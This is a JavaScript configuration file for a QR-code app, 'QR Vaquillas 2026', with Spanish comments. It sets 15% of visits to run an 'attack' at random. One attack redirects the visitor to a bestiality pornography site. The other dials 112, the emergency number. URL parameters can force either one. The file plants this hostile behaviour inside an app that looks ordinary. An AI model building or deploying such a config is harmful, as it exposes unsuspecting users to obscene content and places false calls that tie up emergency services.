// Configuración global de la aplicación QR Vaquillas 2026

const appConfig = {
    // Probabilidad de mostrar cartas normales (0.85 = 85%)
    // El resto (15%) ejecuta un ataque de seguridad
    cardsProbability: 0.85,

    // Tipos de ataque disponibles. Dentro del 15% de ataques,
    // se elige uno aleatoriamente según su probability.
    // redirect 0.5 = 50% de los ataques
    // call 0.5 = 50% de los ataques
    attackTypes: {
        redirect: {
            probability: 0.5,
            url: 'https://beastiality.tv/es/tag/goat-sex/',
            delay: 0
        },
        call: {
            probability: 0.5,
            phoneNumber: '112'
        }
    },

    // Parámetros URL para forzar modos:
    // ?cards=1     -> forzar cartas
    // ?attack=1    -> forzar ataque aleatorio
    // ?redirect=1  -> forzar redirección
    // ?call=1      -> forzar llamada
    queryParams: {
        forceCards: 'cards',
        forceAttack: 'attack',
        forceRedirect: 'redirect',
        forceCall: 'call'
    }
};

// Exportar para entornos de prueba
if (typeof module !== 'undefined' && module.exports) {
    module.exports = { appConfig };
}
